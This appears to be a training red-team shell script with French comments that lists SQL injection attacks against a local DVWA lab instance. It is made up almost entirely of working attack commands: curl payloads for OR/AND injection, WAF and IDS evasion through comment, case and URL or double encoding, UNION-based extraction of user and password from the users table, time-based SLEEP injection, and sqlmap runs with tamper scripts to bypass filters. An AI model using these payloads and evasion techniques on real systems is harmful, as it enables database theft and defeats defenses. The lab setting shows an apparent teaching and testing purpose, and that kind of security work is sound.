# ==========================================
# Red Team - Equipe 2
# R1 - SQL Injection (tests manuels)
# Objectif :
# Tester la vulnérabilité DVWA et contourner
# les mécanismes de détection (WAF / IDS)
# ==========================================


# ------------------------------------------
# 1. SQLi BASIQUE
# Objectif : vérifier si l'application est vulnérable
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' OR 1=1-- -&Submit=Submit"


# ------------------------------------------
# 2. VARIANTE AND
# Objectif : contourner les règles ciblant OR
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' AND 1=1-- -&Submit=Submit"


# ------------------------------------------
# 3. OBFUSCATION AVEC COMMENTAIRES
# Objectif : bypass filtres regex simples
# Technique : remplacer les espaces par /**/
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1'/**/OR/**/1=1-- -&Submit=Submit"


# ------------------------------------------
# 4. VARIATION DE CASSE
# Objectif : contourner les filtres case-sensitive
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' oR 1=1-- -&Submit=Submit"


# ------------------------------------------
# 5. ENCODAGE URL
# Objectif : bypass IDS/WAF basiques
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%201=1--%20-&Submit=Submit"


# ------------------------------------------
# 6. DOUBLE ENCODAGE
# Objectif : contourner les systèmes naïfs
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1%2527%2520OR%25201=1--%2520-&Submit=Submit"


# ------------------------------------------
# 7. UNION SELECT (TEST STRUCTURE)
# Objectif : identifier le nombre de colonnes
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT null,null-- -&Submit=Submit"


# ------------------------------------------
# 8. EXTRACTION UTILISATEURS
# Objectif : récupérer user + password
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit"


# ------------------------------------------
# 9. INJECTION TIME-BASED (FURTIVE)
# Objectif : bypass détection signature
# Technique : retard de réponse serveur
# ------------------------------------------
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' AND SLEEP(5)-- -&Submit=Submit"


# ==========================================
# AUTOMATISATION AVEC SQLMAP
# ==========================================


# ------------------------------------------
# 10. SQLMAP BASIQUE
# Objectif : détecter automatiquement SQLi
# ------------------------------------------
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low" \
--dbs


# ------------------------------------------
# 11. SQLMAP AVANCÉ (BYPASS WAF)
# Objectif : contourner IDS/WAF
# Techniques utilisées :
# - space2comment → remplace espaces
# - randomcase → casse aléatoire
# - charencode → encodage caractères
# ------------------------------------------
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low" \
--tamper=space2comment,randomcase,charencode \
--dbs
